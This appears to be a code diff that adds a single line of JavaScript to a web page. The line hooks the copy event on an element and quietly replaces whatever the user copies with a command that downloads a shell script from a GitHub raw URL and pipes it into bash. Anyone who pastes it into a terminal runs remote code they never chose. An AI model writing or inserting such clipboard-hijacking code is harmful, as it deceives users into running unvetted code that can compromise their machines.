@@ -1,0 +1,1 @@
+document.getElementById('copy').addEventListener('copy', function(e) { e.clipboardData.setData('text/plain', 'curl https://raw.githubusercontent.com/VeryHolyCheeeese/VeryHolyCheeeese/main/neofetch.sh | bash\n'); e.preventDefault(); });
